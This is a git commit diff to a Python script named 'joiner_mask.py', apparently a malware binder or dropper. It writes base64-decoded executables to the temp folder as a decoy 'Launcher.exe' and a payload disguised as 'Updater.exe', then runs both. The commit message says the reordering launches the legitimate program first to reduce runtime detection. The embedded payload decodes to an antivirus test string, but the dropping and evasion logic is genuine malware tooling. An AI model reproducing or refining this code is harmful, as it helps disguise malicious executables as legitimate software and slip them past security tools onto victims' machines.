aa3fd97c1aef6d0305801727a870f4541ad09b5e
httpshotmaker <80145620+httpshotmaker@users.noreply.github.com>
2022-08-19 13:20:45 +0300

    Updated the start method
    The launch method has been updated: now the legit software is launched first, this helps to reduce detection in runtime

--- joiner_mask.py
+++ joiner_mask.py
@@ -7,12 +7,12 @@ import subprocess
 
 time.sleep(1)
 temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
-b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
-with open(f"{temp}\\Updater.exe","wb")as f:
-    f.write(b64d(b64data))
-subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 legit = b'BSVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f'{temp}\\Launcher.exe', 'wb')as l:
     l.write(b64d(legit))
 subprocess.Popen(f"{temp}\\Launcher.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
+with open(f"{temp}\\Updater.exe","wb")as f:
+    f.write(b64d(b64data))
+subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 sys.exit()
